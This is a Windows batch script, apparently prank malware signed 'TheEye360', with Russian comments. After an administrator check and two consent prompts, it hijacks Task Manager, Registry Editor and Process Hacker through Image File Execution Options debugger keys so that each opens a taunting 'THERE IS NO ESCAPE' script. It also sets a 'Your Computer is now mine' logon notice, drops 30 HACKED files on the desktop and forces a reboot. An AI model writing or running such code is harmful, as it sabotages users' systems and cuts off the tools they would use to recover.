@echo off
:: Проверка прав администратора
net session >nul 2>nul
if %errorlevel% NEQ 0 (
    echo ERROR: You need to run this script as Administrator. Please run this as administrator and try again.
	pause
    exit /b
)

:: Первое предупреждение о возможном повреждении компьютера
echo WARNING: This script may cause issues with your computer. Proceed at your own risk!
echo It can modify system files and create unexpected behavior.
echo Do you want to continue? (Y/N)
set /p choice= 

if /I "%choice%" NEQ "Y" (
    echo Script execution cancelled.
    exit
)

:: Второе предупреждение о последствиях
echo LAST WARNING: ARE YOU SURE? This script will make permanent changes to your system.
echo It will modify the registry and create files on your desktop.
echo Are you sure you want to continue? (Y/N)
set /p choice2=

if /I "%choice2%" NEQ "Y" (
    echo Script execution cancelled.
    exit
)

:: Создаём папку
mkdir C:\HarshMode

:: Создаём NoEscape.bat
(
echo @echo off
echo title NOT TOO FAST^:^)
echo echo T
echo timeout /t 1 ^>nul
echo cls
echo echo TH
echo timeout /t 1 ^>nul
echo cls
echo echo THE
echo timeout /t 1 ^>nul
echo cls
echo echo THER
echo timeout /t 1 ^>nul
echo cls
echo echo THERE
echo timeout /t 1 ^>nul
echo cls
echo echo THERE 
echo timeout /t 1 ^>nul
echo cls
echo echo THERE I
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS 
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS N
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO 
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO E
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO ES
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO ESC
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO ESCA
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO ESCAP
echo timeout /t 1 ^>nul
echo cls
echo echo THERE IS NO ESCAPE
echo timeout /t 2 ^>nul
echo exit
) > C:\HarshMode\NoEscape.bat

:: Подменяем диспетчер задач
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "C:\HarshMode\NoEscape.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "C:\HarshMode\NoEscape.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe" /v Debugger /t REG_SZ /d "C:\HarshMode\NoEscape.bat" /f

:: Добавляем записи в реестр для LegalNoticeText и LegacyNoticeCaption
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "Your Computer is now mine" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegacyNoticeCaption /t REG_SZ /d "Your Computer is now mine" /f

:: Создаём 30 документов на рабочем столе с текстом "Your Computer is now mine"
for /l %%i in (1, 1, 30) do (
    echo Your Computer is now mine > "%userprofile%\Desktop\HACKED%%i.txt"
)

cls
echo Start to CRY!
echo WHAT I WANT FROM YOU IS DoNT'scxhcar__?-#___666--____.....
timeout /t 3 >nul
cls
echo Start to CRY!
echo WHAT I WANT FROM YOU IS DoNT'scxhcar__?-#___666--____.....DONT CLICK ANYTHING!:D
echo                                              =created by TheEye360=
shutdown -r -f
timeout /t 10 >nul
pause
